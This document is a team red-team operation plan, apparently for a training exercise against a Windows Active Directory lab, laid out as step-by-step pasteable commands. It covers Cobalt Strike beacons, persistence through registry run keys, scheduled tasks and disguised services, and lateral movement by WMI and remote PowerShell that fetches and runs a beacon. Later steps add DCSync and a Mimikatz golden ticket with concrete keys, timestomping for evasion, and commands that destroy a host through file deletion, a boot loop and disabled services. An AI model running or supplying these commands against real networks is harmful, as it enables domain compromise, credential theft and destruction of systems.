# PEBKAC Op Plan - Team 1

## OBJECTIVES

1. Perform Enumeration to include and NMAP
    * sharpup
    * seatbelt 
    * sharphound
    * set up port proxy
    * run nmap through local kali 
3. Establish User/Admin/System Persistence (On Each Box)
    * reg keys
    * startup folder
    * scheduled task
    * modify/hijack a service binary
    * create own AD account
    * golden ticket
    * **DO NOT GET PERSISTENCE ON THE DC!!!!!!!!!!!**
4. Laterally Move to DC, FS, and DA Box (use different TTPs)
    * Keep Protocol/listener in mind
    * Build own SMB beacon listener
    * schtask
    * wmi
5. Obtain Domain Administrator
    * use sharphound/bloodhound to enumerate AD
    * find active Domain Admin session to steal
6. Perform Golden Ticket
    * dcsync
    * mimikatz
7. Render target (DA) box as unusable
    - COAS:
    * rm C:\
    * boot loop
    * icacls




TIMELINE

1. inital user beacon (S)
2. create smb listener (S)
3. user persistence on initial (S)
4. domain enumeration (S)
5. set up proxy and run nmap (B)
6. system enumeration (B)
7. priv esc to system on initial (B)
8. establish system persistence on initial (B)
9. move to user/Admin context and establish persistence (B)
10. move to DA box and establish system level persistence (wmi)(K)
11. get Domain Admin (K)
12. get golden ticket (K)
13. move to fileshare and establish system level persistence (schtask) (K)
14. move to DC (powershell invoke command)(Z)
15. nuke DA (Z)
16. cleanup fileshare (Z)
17. cleanup DC (Z)
18. cleanup initial (Z)



* Admin scripts should be COA for privesc

## S Pasteables

1. inital user beacon (S)
a. Use bellfry TTP page to generate cobalt strike beacon payload:

```bash
# no pasteables
# put initial beacon somewhere discrete like C:\Users\<username>\AppData\Local\Microsoft\
```

2. create smb listener (S)
a. steps to create smb beacon in cobalt strike
```bash
# click on configure listeners (Headphone button)
# click add at the bottom of the page
# type in your name for the listener
# select Beacon SMB from the drop down
# name the pipe something that belnds in (look at listpipes output)
# inject into another process to get smb beacon callback
# select your smb listener from the drop down after running inject
inject <pid> x64 

# if you want to unlink your smb beacon
# TIP: unlink smb beacon when not in use to avoid loosing it if parent shwacked
unlink <target ip>

#if you want to relink you smb beacon 
link <target ip> <pipe name>
```

3. user persistence on initial (S)
a. Startup Folder
```bash
# Single User
# Will get you a beacon when the user logs in
cd C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
upload <\path\to\beacon.exe>

# All Users
# Probably will no work unless you are already SYSTEM
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
upload <\path\to\beacon.exe>
```
b. Contingency (run key/other bellfry TTP)
```bash
# Query current registry keys
shell reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Add your registry key
shell reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v <TaskName> /t REG_SZ /d <"C:\path\to\beacon.exe">
shell reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# To delete
shell reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v <TaskName> /f
shell reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

4. domain enumeration (S)
a. SharpHound/BloodHound
```bash
# change directory to something discrete
# run SharpHound
# don't forget to log and delete artifacts after done downloading .zip
inlineExecute-Assembly --dotnetassembly /export/home/student.three/Desktop/MissionData/MQT/tools/sharphound/SharpHound.exe
```

## Brown Pasteables
5. set up proxy and run nmap (Brown)
a. Set up proxy:

```bash
# COA 1 below: use cobalt strike. If issues, use netsh native to windows as we performed in class

# Cobalt Strike, right click session -> pivoting -> listener
# save, run below (change port if desired/needed -- slides use 3306)
rportfwd <bind port> windows/beacon_reverse_tcp <forward port>
#fwd port = listener port from C.S.
#I tested 3306 for bind port and worked
#for cleanup,
rfportfwd stop <port>
# remove listener in C.S., and change sleep on beacon to remove interactive status

# KALI:
sudo nano /etc/proxychains4.conf
# add socks5 <TeamServer_IP> <socks_port> to tail
# <socks_port> = 3306
# socks5 10.9.100.10 3306
```

b. Run nmap:

```sh
# KALI:
sudo proxychains nmap -Pn -sV --top-ports 1000 <IP_ADDR/24> -n

# can modify args or range if desired, common ports: 21-25, 53, 80, 111, 135, 137, 139, 443, 445, 3389, 8080
```

6. system enumeration (Brown)
a. Check root dir for mysterious admin scripts
```sh
dir C:\

# look for suspicious directories, can cat some files if necessary
```

b. SharpUp... note binary hasn't been working inlineExecute-Assembly (.net compatability) however normal execute-Assembly has been working

```sh
#COBALT STRIKE:
execute-assembly /export/home/student.three/Desktop/MissionData/MQT/tools/sharpup/SharpUp/Release/SharpUp.exe audit
```

7. priv esc to system on initial (Brown)
a. AdminScripts - if exists
```bash
# may find Logon.ps1 GCI'ing C:\AdminScripts\StartUp to run any .ps1 file that exists in directory
# likely either drop new .ps1 in folder or edit existing .ps1 in folder depending on permissions
# easiest to execute beacon on disk which calls back as system. upload_rename if needed for new beacon, use syntax from next code-block
"C:\<path>\<beaconname>"

# otherwise could add yourself to administrators group, then can steal_token from system process, or could create new user, add to admin group
Add-LocalGroupMember -Group "Administrators" -Member "YOUR_USERNAME"
```
b. SharpUp highlights misconfig
```sh
# if adminscript doesn't exist or work, likely there is a hijackablepath, unquotedservicepath, or some other technique can use, use Klutch's NH beacon to place in appropriate path (using upload_rename), then restart workstation

# example upload_rename
upload_rename /export/home/student.three/Desktop/MissionData/MQT/logs/20250527/up/Brown/student-three.exe \\TRNG-WIN11-DA3\C$\Users\Public\student_three.pptx cleanup.exe

# example restart
shell shutdown -r -f -t 0
```

8. establish system persistence on initial (Brown)
a. New sc create autostart to binary
```bash
# need to create beacon/micl to run that beacon as service exe, example of execution below, would need to change paths/names in micl

dir C:\Windows\system32\print*
upload_rename /local/beacon/path C:\Windows\system32\printmanagement.txt printmanagement.exe C:\Windows\system32\printmanagement.msc (beacon)
upload_rename /local/beacon/path C:\Windows\system32\printsvc.txt printsvc.exe C:\Windows\system32\printui.dll (micl)
dir C:\Windows\system32\print*
run sc create PrntWksSvc start= auto error= ignore binpath= "C:\path\to\minuteclinicbinary.exe" displayname= "Print Workstation Service"
run sc query PrntWksSvc
run sc qc PrntWksSvc
```

9. move to user/Admin context and establish persistence (Brown)
a. List processes, find and inject (new in memory beacon established), persistence with reg query
```bash
cohabPS
inject <pid> x64
whoami #not really necessary

reg query x64 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg add HKCU\Software\Microsoft\Windows\currentversion\run /t REG_SZ /d "<full_beacon_path>"
reg query x64 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
## K Pastables
10. move to DA box and establish system level persistence (wmi)(Klutch)
```
# make sure directory exists, and that AppxProvisioning.xml exists for timestomping
shell dir \\<IP Address>\c$\ProgramData\Microsoft\Windows\
# Uploads a beacon and timestomps it
upload_rename /export/home/<beacon.exe path> \\<IP Address>\c$\ProgramData\Microsoft\Windows\AppxUpdater.exe AppxUpdater.exe c:\ProgramData\Microsoft\Windows\AppxProvisioning.xml
# Execute the updater
powershell Invoke-WmiMethod -Class win32_process -ComputerName <IP Address> -name create -ArgumentList C:\ProgramData\Microsoft\Windows\AppxUpdater.exe 

#create system schtask for persistance
shell schtasks /create /SC ONSTART /RU SYSTEM /TN "AppxUpdater" /TR "C:\ProgramData\Microsoft\Windows\AppxUpdater.exe"

```
11. get Domain Admin (Klutch)
```
# read cohabPS for logged in admin pid - explorer.exe would be nice
inject <PID> x64 <SMB_Beacon>
```
12. get golden ticket (Klutch)
```
dcsync <PID> x64 TRNG.mil TRNG\krbtgt
# To use: 
mimikatz <PID> x64 kerberos::golden /user:blablaw.adm /domain:TRNG.MIL /sid:S-1-5-21-4109842546-2308900119-990011413 /aes256:42b0511184e99d231cbf28899e3a553e70eb7f1b59e29a4e1552873359805bf7 /groups:572,512,513,554,545,544,11,1104 /id:1113 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```
13. move to fileshare and establish system level persistence (schtask) (Klutch)
a. From domain admin, remote upload_rename SMB beacon, link to workstation beacon

```bash
upload_rename /local/beacon/path \\<UNC_PATH>\<beaconname>.txt <newbeaconname>.exe

shell schtasks /create /S <FQDN> /SC Weekly /RU "NT Authority\System" /TN "CleanUpTask" /TR "powershell.exe -c "C:\Users\Public\cleanup.exe"

shell schtasks /Run /S <FQDN> /TN "CleanUpTask"

#ensure current beacon not running as SYSTEM, need to be domain user
link <TARGET>
```

shutdown -r -f -t 300







## Z Pastables

move to DC (powershell invoke command)(Z)
### Laterally move to Domain Controller
- Host beacon on File Server
- Transfer and execute beacon on Domain Controller
    ```powershell=
    powershell Invoke-Command -ComputerName [TARGET] -ScriptBlock {
        $dest="$env:TEMP\[BEACON_ON_TARGET]";
        Copy-Item -Path "\\[HOST]\[PATH_TO_BEACON]" -Destination $dest;
        Start-Process $dest
    }
    ``` 

| Variable | Description |
| -------- |  -------- |
| `[TARGET]`|Domain Controller IP or FQDN|
|`[BEACON_ON_TARGET]`|Beacon file name stored in `temp` directory|
|`[HOST]`|IP of host serving the beacon (File Server)|
|`[PATH_TO_BEACON]`|Path to beacon stored on `[HOST]`|
    
    
### Disable DA Host
- Delete important system files
    - as SYSTEM run
    ```bash
    rm C:\
    shell shutdown -r -f -t 300 # wait 5 min and reboot
    # BDA: from beacon on another host:
    shell ping <targetIP>
    ```
- Bootloop
```bash
shell schtasks /CREATE /SC ONSTART /TN "<taskName>" /TR "shutdown /r /t 0 /f" /F /RU SYSTEM
shell shutdown -r -f -t 0
```
- Disable key services
    - As SYSTEM 
    ```powershell
    powershell {$services = @("eventlog", "RpcSs", "Netlogon", "winmgmt", "LanmanWorkstation"); foreach ($svc in $services) { try { Set-Service -Name $svc -StartupType Disabled; Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue;} catch { }}}
    ```
    - Reboot the target
    ```
    shell shutdown -r -f -t 0
    ```
### Cleanup Actions 
#### File Server
- Remove hosted beacon used to laterally move to DC
- Remove persistance
- Remove beacon
    
#### Domain Controller
- Remove beacon from DC
    - Remote powershell example (Be sure to exit the beacon first)
    ```powershell
    powershell Invoke-Command -ComputerName [TARGET] -ScriptBlock {
        $file="$env:TEMP\[BEACON_ON_TARGET]";
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue;
            if (-not (Test-Path $file) {
                "DELETE_SUCCESS=$file"
            } else {
                "DELETE_FAILURE=$file"
            }
        } else {
            "NOT_FOUND=$file"
        }}}
    ```
| Variable | Description |
| -------- |  -------- |
| `[TARGET]`|Domain Controller IP or FQDN|
|`[BEACON_ON_TARGET]`|Beacon file name stored in `temp` directory|

#### Initial Host
- Remove persistance
- Remove beacon
    